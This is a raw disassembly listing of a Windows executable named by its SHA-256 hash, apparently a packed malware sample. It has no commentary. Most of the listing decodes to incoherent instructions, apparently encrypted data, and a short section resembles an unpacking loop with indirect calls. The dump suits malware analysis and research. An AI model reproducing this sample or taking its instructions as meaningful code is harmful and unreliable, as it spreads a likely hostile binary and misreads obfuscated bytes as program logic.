
9e06978141bced729d71dac9b2381008b89fbde7998285270e02c821e4b812b5.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	jmp    0x4013b4
  401008:	cwde   
  401009:	jb     0x400fd2
  40100b:	inc    eax
  40100c:	pop    ebp
  40100d:	pop    ebp
  40100e:	cdq    
  40100f:	retf   0xfa9e
  401012:	inc    ebp
  401013:	scas   eax,DWORD PTR es:[edi]
  401014:	xchg   ecx,eax
  401015:	mov    ecx,0x7e7e3d2c
  40101a:	jle    0x40109a
  40101c:	xor    BYTE PTR [ecx+0x7e],0x7e
  401020:	into   
  401021:	(bad)  
  401022:	xor    ecx,ebx
  401024:	xor    eax,0xceddcfdb
  401029:	ja     0x401033
  40102b:	or     eax,DWORD PTR [eax]
  40102d:	or     al,0xc
  40102f:	(bad)  
  401031:	bswap  esp
  401033:	adc    al,0x37
  401035:	sbb    al,0x1f
  401037:	mov    ch,0x54
  401039:	or     al,0xa7
  40103b:	ror    DWORD PTR [esi],1
  40103d:	out    dx,eax
  40103e:	mov    cl,0xd3
  401040:	(bad)  
  401041:	or     ecx,DWORD PTR [esi-0x550741ea]
  401047:	dec    ebp
  401048:	sbb    DWORD PTR [ecx+0x561fb6de],esp
  40104e:	loopne 0x4010bf
  401050:	add    ebx,DWORD PTR ds:0x4cc67490
  401056:	mov    ds:0xc8dd215b,al
  40105b:	xor    BYTE PTR [ecx-0x5c368c7e],ah
  401061:	jbe    0x40102b
  401063:	fisttp DWORD PTR [ebp+0x359cc6f5]
  401069:	jecxz  0x4010a7
  40106b:	and    ebp,0x4f
  40106e:	(bad)  
  40106f:	xchg   esi,eax
  401070:	dec    ebp
  401071:	inc    DWORD PTR [edi-0x2d5a886c]
  401077:	mov    cl,0x41
  401079:	loope  0x4010a1
  40107b:	pop    ecx
  40107c:	sub    edi,DWORD PTR [edx-0x4f61911e]
  401082:	jae    0x4010a1
  401084:	retf   
  401085:	call   0xe8ca:0x5ee3d82d
  40108c:	mov    ah,0xfc
  40108e:	loop   0x40102a
  401090:	cmp    eax,0xc76978cf
  401095:	sub    al,0xc1
  401097:	or     dl,ch
  401099:	sbb    eax,0xb39965d
  40109e:	outs   dx,DWORD PTR ds:[esi]
  40109f:	ins    DWORD PTR es:[edi],dx
  4010a0:	je     0x4010a6
  4010a2:	cmp    eax,0x24588ed1
  4010a7:	jns    0x401128
  4010a9:	pop    DWORD PTR ds:[edx]
  4010ac:	shl    DWORD PTR [esi-0x2ea6acfd],cl
  4010b2:	mov    BYTE PTR ds:0x15d550db,0x7d
  4010b9:	sahf   
  4010ba:	mov    dh,0x43
  4010bc:	daa    
  4010bd:	sbb    DWORD PTR [ebx],esp
  4010bf:	addr16 and eax,0x4f3edb12
  4010c5:	in     al,0xc0
  4010c7:	test   al,0xb9
  4010c9:	dec    ecx
  4010ca:	nop
  4010cb:	xchg   edx,ebx
  4010cd:	leave  
  4010ce:	ds pop es
  4010d0:	pushf  
  4010d1:	xor    BYTE PTR [ebx+0x535f4108],0xde
  4010d8:	xchg   ecx,eax
  4010d9:	inc    ebp
  4010da:	test   BYTE PTR [ebp+0x140de5af],cl
  4010e0:	std    
  4010e1:	icebp  
  4010e2:	out    dx,al
  4010e3:	adc    BYTE PTR [esi],bl
  4010e5:	and    ah,bl
  4010e7:	mov    cl,0xb7
  4010e9:	repnz push edi
  4010eb:	test   BYTE PTR [ebx],0xee
  4010ee:	xchg   ecx,eax
  4010ef:	sub    ecx,edi
  4010f1:	loopne 0x4010e0
  4010f3:	scas   eax,DWORD PTR es:[edi]
  4010f4:	xchg   ecx,eax
  4010f5:	inc    ecx
  4010f6:	mov    eax,ds:0x58422b0
  4010fb:	jb     0x4010e0
  4010fd:	add    eax,0x5fe38877
  401102:	fist   WORD PTR [edx]
  401104:	ins    DWORD PTR es:[edi],dx
  401105:	cwde   
  401106:	sti    
  401107:	scas   al,BYTE PTR es:[edi]
  401108:	pop    esp
  401109:	pop    ebp
  40110a:	or     eax,0xb4f45829
  40110f:	pop    edi
  401110:	lods   eax,DWORD PTR ds:[esi]
  401111:	les    ebx,FWORD PTR [esp+edi*4]
  401114:	lods   eax,DWORD PTR ds:[esi]
  401115:	rol    ebx,cl
  401117:	inc    ebp
  401118:	fnsave [ebx-0x4dd530ba]
  40111e:	xor    DWORD PTR [edi-0x59],esi
  401121:	mov    dl,0xda
  401123:	mov    ecx,0x6d0251a6
  401128:	test   al,0x91
  40112a:	mov    bl,0x2c
  40112c:	push   eax
  40112d:	cmp    al,0x3a
  40112f:	mov    eax,0x725f7dfd
  401134:	jge    0x4010e1
  401136:	sahf   
  401137:	gs push ss
  401139:	lods   al,BYTE PTR ds:[esi]
  40113a:	jbe    0x4010bd
  40113c:	mov    WORD PTR ds:0xa2a83cc3,fs
  401142:	cmp    eax,0x17c14521
  401147:	rcr    BYTE PTR ds:0x102595f8,1
  40114d:	mov    al,al
  40114f:	sti    
  401150:	cwde   
  401151:	test   DWORD PTR [ebp-0x35],ecx
  401154:	icebp  
  401155:	jne    0x401166
  401157:	dec    esi
  401158:	into   
  401159:	dec    edx
  40115a:	pop    ecx
  40115b:	cmp    al,BYTE PTR [eax-0x53ee0e1a]
  401161:	imul   ecx,DWORD PTR [ebx-0x52],0xffffffde
  401165:	push   0xc9e44c2f
  40116a:	outs   dx,BYTE PTR ds:[esi]
  40116b:	call   DWORD PTR [ebx+0xd]
  40116e:	jb     0x4011cf
  401170:	xor    DWORD PTR [ebx],eax
  401172:	xor    al,0x8f
  401174:	cmp    al,0x10
  401176:	bound  esp,QWORD PTR [edi]
  401178:	mov    al,0x62
  40117a:	retf   
  40117b:	cs push ds
  40117d:	dec    ebp
  40117e:	adc    BYTE PTR [edx],dl
  401180:	pop    ebp
  401181:	xor    BYTE PTR [eax-0x2535d9f6],0xd
  401188:	pop    edi
  401189:	nop
  40118a:	outs   dx,DWORD PTR ds:[esi]
  40118b:	and    eax,0xa7d2771d
  401190:	add    BYTE PTR [esi],dh
  401192:	cmp    al,0xfe
  401194:	push   ss
  401195:	cmp    BYTE PTR [ecx-0x6e92c47f],0x50
  40119c:	dec    ecx
  40119d:	mov    al,0xc2
  40119f:	in     eax,dx
  4011a0:	inc    ebx
  4011a1:	(bad)  
  4011a2:	nop
  4011a3:	add    BYTE PTR [ecx-0x7d3d2f54],dl
  4011a9:	jle    0x4011b1
  4011ab:	mov    esi,0x409903de
  4011b0:	icebp  
  4011b1:	stos   DWORD PTR es:[edi],eax
  4011b2:	mov    bh,0xe1
  4011b4:	xor    BYTE PTR [edx+0x26b295c6],cl
  4011ba:	stos   DWORD PTR es:[edi],eax
  4011bb:	ror    eax,0x54
  4011be:	inc    esi
  4011bf:	push   esi
  4011c0:	ror    ah,1
  4011c2:	push   es
  4011c3:	push   esp
  4011c5:	pop    ecx
  4011c6:	cli    
  4011c7:	adc    DWORD PTR [ecx+eiz*2+0x2350123a],esp
  4011ce:	imul   esp,DWORD PTR [esi+edi*1+0x6f],0x974d6d23
  4011d6:	jle    0x401191
  4011d8:	add    BYTE PTR [ebx+0x54],dh
  4011db:	ret    0x5dd7
  4011de:	adc    esi,ecx
  4011e0:	pop    ebp
  4011e1:	les    edi,FWORD PTR [ecx+0xca3700e]
  4011e7:	add    DWORD PTR [ebx+0x3f941687],ecx
  4011ed:	xor    dh,BYTE PTR [edi-0x1c]
  4011f0:	retf   
  4011f1:	push   cs
  4011f2:	push   esp
  4011f3:	std    
  4011f4:	sbb    DWORD PTR [edi+0x19],edi
  4011f7:	out    0x45,al
  4011f9:	or     al,0xf2
  4011fb:	xchg   DWORD PTR [ebx],edx
  4011fd:	add    eax,DWORD PTR [ebx+ecx*1-0x6e]
  401201:	arpl   WORD PTR [esi],si
  401203:	xor    al,0x31
  401205:	lea    ecx,[edx]
  401207:	addr16 enter 0x26b1,0xd3
  40120c:	fimul  DWORD PTR [esi+0x6b]
  40120f:	out    dx,eax
  401210:	or     al,0x5b
  401212:	sub    bh,bh
  401214:	daa    
  401215:	mov    esp,DWORD PTR [esi]
  401217:	sbb    BYTE PTR [edx-0x80],0xfd
  40121b:	mov    eax,0xefe34637
  401220:	jl     0x40128c
  401222:	in     al,dx
  401223:	test   DWORD PTR [edi+eiz*4],ebx
  401226:	es and eax,0xf1679836
  40122c:	ins    BYTE PTR es:[edi],dx
  40122d:	(bad)  
  40122e:	xchg   esi,eax
  40122f:	repnz pop edx
  401231:	arpl   WORD PTR [edi],di
  401233:	shl    DWORD PTR [edx-0x7c],0x80
  401237:	xchg   ebp,eax
  401238:	shl    DWORD PTR [edx],1
  40123a:	or     esi,DWORD PTR [edx]
  40123c:	cwde   
  40123d:	cmp    BYTE PTR [ecx],ah
  40123f:	(bad)  
  401240:	xchg   esp,eax
  401241:	call   0x50f8be11
  401246:	inc    esi
  401247:	push   esp
  401248:	div    BYTE PTR [ebp+0x7ebd2e2f]
  40124e:	test   al,0x2
  401250:	popa   
  401251:	adc    esi,DWORD PTR [edx-0x777de50b]
  401257:	cmp    DWORD PTR [ecx],0xffffff94
  40125a:	push   eax
  40125b:	and    eax,DWORD PTR [eax+0x3b]
  40125e:	pop    esi
  40125f:	(bad)  [eax]
  401261:	cmp    al,0xe5
  401263:	and    eax,0xfc2af1f9
  401268:	inc    esp
  401269:	lock mov BYTE PTR [ecx],dl
  40126c:	arpl   cx,si
  40126e:	xchg   bl,cl
  401270:	push   ss
  401271:	jne    0x4012c3
  401273:	inc    ebp
  401274:	imul   eax,edi,0xfffffff8
  401277:	call   0x3ef8:0xb4f25d84
  40127e:	test   eax,0x21d8d9f6
  401283:	out    dx,al
  401284:	loope  0x40126d
  401286:	outs   dx,BYTE PTR ds:[esi]
  401287:	mov    dh,0x8b
  401289:	sar    DWORD PTR [esi],0x6
  40128c:	jo     0x7e9883cd
  401292:	pop    ds
  401293:	rcl    DWORD PTR [eax+edx*2-0x23],1
  401297:	push   ebp
  401298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401299:	pop    edi
  40129a:	and    di,ax
  40129d:	fbstp  TBYTE PTR ds:0xd7572dd2
  4012a3:	jmp    0x89bd6ece
  4012a8:	cmp    edx,DWORD PTR [ecx+0x56]
  4012ab:	mov    bl,0x47
  4012ad:	mov    al,0x5f
  4012af:	sub    al,0xac
  4012b1:	lods   eax,DWORD PTR ds:[esi]
  4012b2:	dec    edx
  4012b3:	lea    esi,[edx]
  4012b5:	retf   0xdd51
  4012b8:	jmp    0x7fe964cc
  4012bd:	mov    ah,0xc7
  4012bf:	jle    0x4012b6
  4012c1:	shl    ch,0x94
  4012c4:	dec    edx
  4012c5:	mov    bl,0x8a
  4012c7:	mov    edi,0xe468e995
  4012cc:	sub    DWORD PTR [esi+0x7],ebx
  4012cf:	xchg   esi,eax
  4012d0:	call   0x2e49:0xc3b0f8ac
  4012d7:	mov    fs,WORD PTR [esi+0x29]
  4012da:	and    dl,bl
  4012dc:	in     eax,0x67
  4012de:	mov    ds:0x1cbcd3d8,eax
  4012e3:	mov    ebp,DWORD PTR [eax+0x32162946]
  4012e9:	pop    ds
  4012ea:	or     al,0xc2
  4012ec:	jle    0x40130a
  4012ee:	test   DWORD PTR [ecx],esp
  4012f0:	repnz push DWORD PTR ss:[ebx+edi*4-0x203688bb]
  4012f9:	push   eax
  4012fa:	les    esi,FWORD PTR [esi-0x29e9badf]
  401300:	cmp    edi,DWORD PTR [edx+0x7f6d9369]
  401306:	outs   dx,BYTE PTR ds:[esi]
  401307:	loope  0x401357
  401309:	or     esp,DWORD PTR [edx]
  40130b:	push   0xffffff8e
  40130d:	gs iret 
  40130f:	or     al,0x75
  401311:	or     DWORD PTR [edx-0x3fc8ea15],edx
  401317:	icebp  
  401318:	out    0x85,al
  40131a:	out    0x6,al
  40131c:	(bad)  
  40131e:	std    
  40131f:	dec    eax
  401320:	or     al,0xbc
  401322:	(bad)  
  401323:	or     esi,ebp
  401325:	dec    ecx
  401326:	mov    ah,ah
  401328:	rcr    BYTE PTR [eax],0x9e
  40132b:	sub    al,0x96
  40132d:	xchg   DWORD PTR [eax-0x7e29473f],ecx
  401333:	pusha  
  401334:	cli    
  401335:	inc    esp
  401336:	(bad)  
  401337:	sub    DWORD PTR fs:[edx+0x47],edx
  40133b:	adc    BYTE PTR [edx+eiz*1-0x38],ah
  40133f:	int3   
  401340:	push   ecx
  401341:	(bad)  
  401342:	and    BYTE PTR [esi+0x6b9b5ec8],ch
  401348:	or     BYTE PTR [eax-0x5484e898],0x3d
  40134f:	mov    ecx,0x81c13b8a
  401354:	frstor [ebx-0x5f]
  401357:	stos   DWORD PTR es:[edi],eax
  401358:	push   es
  401359:	push   0x2d0240b1
  40135e:	or     DWORD PTR [eax-0x63a78519],0x3fb2c6d2
  401368:	outs   dx,BYTE PTR ds:[esi]
  401369:	pop    ebp
  40136a:	mov    eax,ds:0xef58400d
  40136f:	inc    ebx
  401370:	pop    ecx
  401371:	ret    0x5e5
  401374:	add    ch,BYTE PTR [ecx]
  401376:	outs   dx,BYTE PTR ds:[esi]
  401377:	enter  0xbf06,0xfe
  40137b:	ret    0x57f6
  40137e:	xlat   BYTE PTR ds:[ebx]
  40137f:	mov    WORD PTR [edi],cs
  401381:	xchg   edx,eax
  401382:	imul   DWORD PTR [ebx-0x4fdd9407]
  401388:	mov    ds:0xdcff2f3e,eax
  40138d:	mov    ecx,0x11488c37
  401392:	sbb    eax,0xed4af1ac
  401397:	int3   
  401398:	pop    ebx
  401399:	sub    esp,DWORD PTR [edx+0x60]
  40139c:	sbb    DWORD PTR [ebx-0x4d],esi
  40139f:	ret    0xd74c
  4013a2:	(bad)  
  4013a3:	cli    
  4013a4:	imul   edx,ebx,0x992b7e1d
  4013aa:	icebp  
  4013ab:	aam    0x4e
  4013ad:	sub    al,0x32
  4013af:	dec    ebp
  4013b0:	lahf   
  4013b1:	push   esp
  4013b2:	sub    eax,0x2cec8393
  4013b7:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  4013be:	sbb    DWORD PTR ds:0x430506,edi
  4013c4:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  4013cb:	sub    ecx,eax
  4013cd:	mov    eax,0x9507
  4013d2:	mov    WORD PTR [ebp-0x4],ax
  4013d6:	mov    DWORD PTR ds:0x42eea0,0x1f
  4013e0:	cmp    DWORD PTR ds:0x42eea0,0x0
  4013e7:	je     0x40141b
  4013ed:	cmp    DWORD PTR ds:0x42eea0,0x27
  4013f4:	jne    0x401403
  4013fa:	push   DWORD PTR [ebp-0x1c]
  4013fd:	call   DWORD PTR ds:0x42ea6c
  401403:	mov    ecx,DWORD PTR ds:0x42eea0
  401409:	dec    ecx
  40140a:	mov    DWORD PTR ds:0x42eea0,ecx
  401410:	jmp    0x4013e0
  401415:	sub    ecx,DWORD PTR ds:0x42eea4
  40141b:	lea    eax,[ebp-0x24]
  40141e:	mov    DWORD PTR ds:0x4305d6,0x15
  401428:	cmp    DWORD PTR ds:0x4305d6,0x0
  40142f:	je     0x401491
  401435:	cmp    DWORD PTR ds:0x4305d6,0x9
  40143c:	jne    0x40145f
  401442:	push   DWORD PTR [ebp-0x28]
  401445:	push   0x42e865
  40144a:	push   0x78ed
  40144f:	push   0x520a
  401454:	push   0x5250
  401459:	call   DWORD PTR ds:0x42ea70
  40145f:	cmp    DWORD PTR ds:0x4305d6,0xa
  401466:	jne    0x401479
  40146c:	mov    ecx,DWORD PTR ds:0x4305d6
  401472:	dec    ecx
  401473:	mov    DWORD PTR ds:0x4305d6,ecx
  401479:	mov    ecx,DWORD PTR ds:0x4305d6
  40147f:	dec    ecx
  401480:	mov    DWORD PTR ds:0x4305d6,ecx
  401486:	jmp    0x401428
  40148b:	and    ecx,DWORD PTR ds:0x43051a
  401491:	mov    DWORD PTR [ebp-0x28],eax
  401494:	and    ecx,ecx
  401496:	mov    eax,DWORD PTR [ebp+0x8]
  401499:	jmp    0x40184a
  40149e:	sub    ch,BYTE PTR [esi+0x5aba4a9e]
  4014a4:	jmp    0x8750:0xc48b26e
  4014ab:	mov    gs,edx
  4014ad:	and    eax,0x7e7e7182
  4014b2:	xor    BYTE PTR [ecx+0x7e],0x7e
  4014b6:	push   cs
  4014b7:	push   eax
  4014b8:	ficom  DWORD PTR [edx-0x57fc40c1]
  4014be:	jb     0x40149d
  4014c0:	test   BYTE PTR [edx+0x2c],ch
  4014c3:	cs push ebx
  4014c5:	jmp    0xc3bdda99
  4014ca:	or     dl,BYTE PTR [ebx]
  4014cc:	xchg   ecx,eax
  4014cd:	mov    edx,0xcbbd00fe
  4014d2:	fs gs jp 0x401475
  4014d6:	push   ebx
  4014d7:	jg     0x40151b
  4014d9:	or     BYTE PTR [esi-0x7b89b143],bh
  4014df:	int3   
  4014e0:	fst    DWORD PTR [edx+0x244b2ac]
  4014e6:	push   cs
  4014e7:	(bad)  
  4014e8:	in     al,0xde
  4014ea:	sub    ebx,DWORD PTR [ebx+0x4d]
  4014ed:	cld    
  4014ee:	fcomp  QWORD PTR [edi+0x8eb3dcb]
  4014f4:	dec    ebp
  4014f5:	push   esp
  4014f6:	jge    0x4014f2
  4014f8:	call   0x1fb7:0x278df856
  4014ff:	jb     0x401526
  401501:	adc    esp,ebp
  401503:	shl    DWORD PTR ds:0x35d5cfaa,cl
  401509:	jmp    FWORD PTR [esp+eiz*8]
  40150c:	sub    bl,al
  40150e:	mov    ds,eax
  401510:	mov    edi,0xfdd8a5df
  401515:	xor    eax,0x1dcaf248
  40151a:	aad    0x30
  40151c:	lds    edi,FWORD PTR [ecx]
  40151e:	dec    edi
  40151f:	xor    cl,BYTE PTR ds:0xb01a0806
  401525:	adc    eax,0x2fcb1158
  40152a:	loope  0x401590
  40152c:	or     DWORD PTR [ecx-0x8],0x46
  401530:	les    ebp,FWORD PTR [edi]
  401532:	inc    esi
  401533:	push   ecx
  401534:	popf   
  401535:	jmp    0x4015b5
  401537:	mov    ah,0x4f
  401539:	or     eax,DWORD PTR [ebx-0x6e]
  40153c:	je     0x401564
  40153e:	nop
  40153f:	pop    ebp
  401540:	add    ebx,ebp
  401542:	ds into 
  401544:	pop    esi
  401545:	loopne 0x4015c5
  401547:	mov    dh,0x9b
  401549:	sbb    eax,DWORD PTR [eax+esi*2-0x4799924d]
  401550:	sbb    al,dh
  401552:	and    esp,0x49
  401555:	sub    DWORD PTR [ecx],0xffffffc4
  401558:	ffree  st(0)
  40155a:	fdiv   DWORD PTR [ebx+0x1a]
  40155d:	mov    dh,0xb9
  40155f:	push   esp
  401560:	ror    DWORD PTR [edi+0x32c6233e],cl
  401566:	jle    0x40154f
  401568:	imul   esi,esp,0x1cbadc94
  40156e:	and    al,0xae
  401570:	dec    ebx
  401571:	mov    al,0xc3
  401573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401574:	nop
  401575:	jbe    0x401505
  401577:	aam    0x78
  401579:	icebp  
  40157a:	daa    
  40157b:	mov    dl,0x49
  40157d:	jge    0x40155e
  40157f:	imul   esi
  401581:	lahf   
  401582:	lock pop ss
  401584:	ror    DWORD PTR [ecx-0x3ca0535e],1
  40158a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40158b:	or     cl,ch
  40158d:	daa    
  40158e:	mov    ah,bh
  401590:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  401592:	cli    
  401593:	and    ah,BYTE PTR [esi+0x10]
  401596:	rol    al,1
  401598:	(bad)  
  401599:	ds adc ecx,edx
  40159c:	lods   al,BYTE PTR ds:[esi]
  40159d:	scas   al,BYTE PTR es:[edi]
  40159e:	ret    
  40159f:	sub    ebx,ebp
  4015a1:	xor    ch,BYTE PTR ds:0x3effebd7
  4015a7:	pop    es
  4015a8:	fmul   st(4),st
  4015aa:	sbb    al,0xaf
  4015ac:	into   
  4015ad:	inc    ebp
  4015ae:	sbb    DWORD PTR [edx+0x49],0xd
  4015b2:	add    eax,0x574e3043
  4015b7:	push   ebp
  4015b8:	and    DWORD PTR [edi-0x73db0159],edi
  4015be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015bf:	js     0x401621
  4015c1:	jo     0x4015a4
  4015c3:	inc    eax
  4015c4:	clc    
  4015c5:	int3   
  4015c6:	push   ebx
  4015c7:	std    
  4015c8:	les    ecx,FWORD PTR [edx]
  4015ca:	in     eax,dx
  4015cb:	pop    DWORD PTR [ecx+0xc3c3e5a]
  4015d1:	push   edx
  4015d2:	mov    eax,ds:0xadcfde39
  4015d7:	dec    ebx
  4015d8:	push   ss
  4015d9:	mov    ds:0xca9ada35,eax
  4015de:	call   0xbe:0x224a7ce6
  4015e5:	cmp    edx,DWORD PTR [ebx+0x67]
  4015e8:	and    BYTE PTR [eax+0x2084c16],al
  4015ee:	lea    ebp,[ebx+0x3a]
  4015f1:	shl    BYTE PTR ds:0x9e0e6b03,0xef
  4015f8:	mov    ebx,0x306a79d5
  4015fd:	test   DWORD PTR [eax],ecx
  4015ff:	push   ss
  401600:	adc    esp,esp
  401602:	jmp    0x40165c
  401604:	imul   esi,DWORD PTR [eax-0x4f],0x61
  401608:	mov    esi,0x22ca6fec
  40160d:	mov    bl,0x14
  40160f:	or     al,0xe2
  401611:	jl     0x4015c2
  401613:	aam    0x81
  401615:	xchg   dl,dl
  401617:	push   0xffffffc0
  401619:	sub    ebx,DWORD PTR [edi-0x38]
  40161c:	lods   eax,DWORD PTR ds:[esi]
  40161d:	aam    0xf9
  40161f:	sub    BYTE PTR [edi+0x8267213],al
  401625:	ret    0x3c83
  401628:	push   edi
  401629:	fisubr WORD PTR [ebx-0x2eafdc7e]
  40162f:	jge    0x4015cd
  401631:	pop    ecx
  401632:	xchg   ecx,eax
  401633:	inc    edi
  401634:	mov    esi,0x13254a68
  401639:	retf   
  40163a:	and    al,0x61
  40163c:	out    0xaa,al
  40163e:	inc    esp
  40163f:	cmp    eax,0x14237e1
  401644:	scas   eax,DWORD PTR es:[edi]
  401645:	enter  0x7926,0xe7
  401649:	add    eax,0xb40cf27f
  40164e:	mov    cl,0xfb
  401651:	and    edx,DWORD PTR [esi+eiz*2+0x19]
  401655:	push   esp
  401656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401657:	mov    ch,0xb2
  401659:	jne    0x401644
  40165b:	js     0x401603
  40165d:	fsubp  st(4),st
  40165f:	xchg   edx,eax
  401660:	push   esi
  401661:	add    eax,0xbf4e6878
  401666:	add    eax,0x39bb59d2
  40166b:	push   es
  40166c:	dec    esi
  40166d:	arpl   WORD PTR ds:0xb0f65,sp
  401673:	shr    DWORD PTR [eax],1
  401675:	dec    eax
  401676:	cmc    
  401677:	adc    esp,0xffffff8f
  40167a:	xchg   BYTE PTR [ebx+eax*2-0x1b],dh
  40167e:	mov    ?,WORD PTR [ebx-0x3581b69d]
  401684:	ffreep st(0)
  401686:	popf   
  401687:	mov    ah,0x37
  401689:	je     0x40162e
  40168b:	mov    ah,dl
  40168d:	cmp    DWORD PTR [ecx+0x4e],edx
  401690:	adc    eax,0x5412eee7
  401695:	(bad)  
  401696:	pop    ebx
  401697:	pop    ss
  401698:	and    DWORD PTR [esi],edi
  40169a:	inc    eax
  40169b:	fnstsw WORD PTR [ebp-0x470a674]
  4016a1:	fldcw  WORD PTR [ebx]
  4016a3:	mov    bh,0xcf
  4016a5:	cwde   
  4016a6:	cdq    
  4016a7:	or     DWORD PTR [ecx],0x4c
  4016aa:	cmp    eax,0x60fb1982
  4016af:	arpl   WORD PTR [eax],sp
  4016b1:	and    edi,DWORD PTR [ebp+0x555f3813]
  4016b7:	push   edx
  4016b8:	inc    ebp
  4016b9:	retf   0x2485
  4016bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016bd:	push   esi
  4016be:	xchg   esi,eax
  4016bf:	xchg   BYTE PTR [ebx],dh
  4016c1:	jb     0x4016e6
  4016c3:	inc    esp
  4016c4:	clc    
  4016c5:	lahf   
  4016c6:	aas    
  4016c7:	inc    edx
  4016c8:	ss push 0xaea3ac3b
  4016ce:	pop    es
  4016cf:	pop    eax
  4016d0:	pop    edx
  4016d1:	call   0xbb5090a3
  4016d6:	cli    
  4016d7:	cmp    edi,DWORD PTR es:[ebp+esi*1-0x65]
  4016dc:	push   ss
  4016dd:	aaa    
  4016de:	shr    dl,0x16
  4016e1:	icebp  
  4016e2:	cli    
  4016e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016e4:	mov    ebx,esp
  4016e6:	js     0x401702
  4016e8:	scas   eax,DWORD PTR es:[edi]
  4016e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016ea:	pop    eax
  4016eb:	popa   
  4016ec:	mov    BYTE PTR [esi-0x3],dh
  4016ef:	pavgw  mm1,mm5
  4016f2:	inc    ecx
  4016f3:	bound  eax,QWORD PTR [edx]
  4016f5:	not    BYTE PTR ds:0xf68f2428
  4016fb:	push   ss
  4016fc:	cmp    eax,0x59586a17
  401701:	push   ds
  401702:	jle    0x401711
  401704:	sbb    eax,0xe0a461ca
  401709:	test   DWORD PTR [eax],ebp
  40170b:	repz jb 0x4016f5
  40170e:	jnp    0x4016b7
  401710:	loope  0x40178c
  401712:	cmp    DWORD PTR [edi+ebx*2-0x3887b8eb],ecx
  401719:	xor    ebx,DWORD PTR [ebp-0x1e]
  40171c:	dec    esi
  40171d:	aam    0x86
  40171f:	popf   
  401720:	in     al,0x3b
  401722:	(bad)  
  401724:	std    
  401725:	lahf   
  401726:	stos   DWORD PTR es:[di],eax
  401728:	push   es
  401729:	push   ebx
  40172a:	mov    ecx,0x7e5f24ce
  40172f:	sub    DWORD PTR [ecx+eiz*1-0x3d],edi
  401733:	ss push ecx
  401735:	adc    ebp,DWORD PTR [esi-0x4d104fc]
  40173b:	jmp    0x401752
  40173d:	std    
  40173e:	ja     0x401770
  401740:	mov    DWORD PTR [edx],edi
  401742:	arpl   WORD PTR [ecx-0x16],cx
  401745:	cwde   
  401746:	cdq    
  401747:	rol    ecx,0x5f
  40174a:	mov    eax,0x4881e8a2
  40174f:	sub    dh,BYTE PTR [esi]
  401751:	test   BYTE PTR [esi],cl
  401753:	push   edi
  401754:	mov    ss,WORD PTR [eax-0x3f]
  401757:	mov    ebx,0x6771b3de
  40175c:	fimul  DWORD PTR [ecx-0x2f915288]
  401762:	out    0xd5,eax
  401764:	mov    bh,0x42
  401766:	push   eax
  401767:	mov    es,WORD PTR [ebx]
  401769:	inc    edx
  40176a:	xchg   esp,eax
  40176b:	push   cs
  40176c:	mov    ah,0x7
  40176e:	ret    
  40176f:	popa   
  401770:	sub    eax,0xb6b08901
  401775:	dec    edi
  401776:	test   DWORD PTR [ebp-0x29],ecx
  401779:	(bad)  
  40177b:	push   cs
  40177c:	test   al,0xe6
  40177e:	daa    
  40177f:	out    dx,eax
  401780:	cmp    BYTE PTR [esi-0x80],al
  401783:	pop    ds
  401784:	sahf   
  401785:	call   0x5e12:0x1c8055fa
  40178c:	mov    bl,0xc5
  40178e:	pop    ebp
  40178f:	cmp    eax,0xd934666e
  401794:	mov    bh,0x42
  401796:	lods   al,BYTE PTR ds:[esi]
  401797:	pop    eax
  401798:	jmp    0xfc41:0x81cb50d9
  40179f:	mov    eax,0xd5435118
  4017a4:	push   ebp
  4017a5:	mov    al,ds:0x2866beb3
  4017aa:	and    esp,DWORD PTR [ecx-0xc]
  4017ad:	and    eax,0xef7e984d
  4017b2:	les    eax,FWORD PTR [ebx]
  4017b4:	out    0xe6,al
  4017b6:	aad    0x3f
  4017b8:	add    BYTE PTR [ebp-0x60],dl
  4017bb:	adc    ebx,edx
  4017bd:	or     ebx,DWORD PTR [ebx+0x47]
  4017c0:	aas    
  4017c1:	rcl    BYTE PTR [edi-0x63c5ff44],0x52
  4017c8:	loop   0x40182e
  4017ca:	mov    DWORD PTR [edi],ebp
  4017cc:	inc    ecx
  4017cd:	sbb    al,0x84
  4017cf:	sub    DWORD PTR [ebx+0x23dffe39],0x5
  4017d6:	call   0x973e9f3
  4017db:	cwde   
  4017dc:	or     BYTE PTR [eax+0x23],ch
  4017df:	repnz pop ss
  4017e1:	push   ecx
  4017e2:	enter  0x8e8a,0x1f
  4017e6:	xchg   edx,eax
  4017e7:	inc    ebx
  4017e8:	sbb    eax,0x14550ea5
  4017ed:	out    dx,eax
  4017ee:	aas    
  4017ef:	js     0x401785
  4017f1:	popf   
  4017f2:	jae    0x4017cb
  4017f4:	push   edi
  4017f5:	test   edx,eax
  4017f7:	loop   0x4017c6
  4017f9:	imul   ebx,DWORD PTR [edx],0xffffff99
  4017fc:	add    al,0x3f
  4017fe:	inc    ebx
  4017ff:	into   
  401800:	push   es
  401801:	sub    BYTE PTR [edx-0x29],ah
  401804:	ret    
  401805:	jne    0x4017cd
  401807:	cmp    eax,0x695e800f
  40180c:	sub    ebx,DWORD PTR [edx]
  40180e:	xor    esi,edi
  401810:	mov    ah,0xe8
  401812:	xlat   BYTE PTR ds:[ebx]
  401813:	push   edx
  401814:	push   edx
  401815:	mov    esp,?
  401817:	push   ds
  401818:	mov    bl,0xc7
  40181a:	(bad)  
  40181b:	and    BYTE PTR [ebp-0x6f],dl
  40181e:	inc    ecx
  40181f:	in     eax,dx
  401820:	pop    ds
  401821:	mov    ecx,0xa202b828
  401826:	retf   0x5128
  401829:	pop    eax
  40182a:	out    dx,eax
  40182b:	pop    ds
  40182c:	xchg   esi,eax
  40182d:	xchg   ebx,eax
  40182e:	repz js 0x401862
  401831:	ins    DWORD PTR es:[edi],dx
  401832:	sub    edx,edi
  401834:	push   edx
  401835:	sub    DWORD PTR [esi-0x70],edx
  401838:	xor    bl,ah
  40183a:	inc    edi
  40183b:	sub    DWORD PTR [esi+edi*8],eax
